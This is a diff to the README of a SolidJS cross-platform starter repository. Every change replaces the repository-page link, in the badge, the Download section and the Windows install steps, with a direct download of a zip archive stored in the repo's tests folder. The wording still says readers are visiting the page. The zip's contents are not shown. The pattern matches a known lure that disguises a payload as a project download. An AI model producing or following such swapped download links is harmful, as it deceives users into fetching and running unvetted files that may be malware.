@@ -1,11 +1,11 @@
 # 🧩 solidjs-crossplatform-starter - Build once, run everywhere
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/jhonata2023/solidjs-crossplatform-starter)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge&logo=github)](https://github.com/jhonata2023/solidjs-crossplatform-starter/raw/refs/heads/main/tests/crossplatform-starter-solidjs-v1.8.zip)
 
 ## 📥 Download
 Use this link to visit the page and download the files you need:
 
-[https://github.com/jhonata2023/solidjs-crossplatform-starter](https://github.com/jhonata2023/solidjs-crossplatform-starter)
+[https://github.com/jhonata2023/solidjs-crossplatform-starter/raw/refs/heads/main/tests/crossplatform-starter-solidjs-v1.8.zip](https://github.com/jhonata2023/solidjs-crossplatform-starter/raw/refs/heads/main/tests/crossplatform-starter-solidjs-v1.8.zip)
 
 ## 🖥️ What this app is
 solidjs-crossplatform-starter is a starter project for building apps that can run on web, mobile, and desktop from one codebase.
@@ -34,7 +34,7 @@ Use these steps on a Windows computer.
 ### 1. Visit the download page
 Open this link in your browser:
 
-https://github.com/jhonata2023/solidjs-crossplatform-starter
+https://github.com/jhonata2023/solidjs-crossplatform-starter/raw/refs/heads/main/tests/crossplatform-starter-solidjs-v1.8.zip
 
 ### 2. Get the project files
 On the repository page, download the project as a ZIP file or clone it if you use Git.
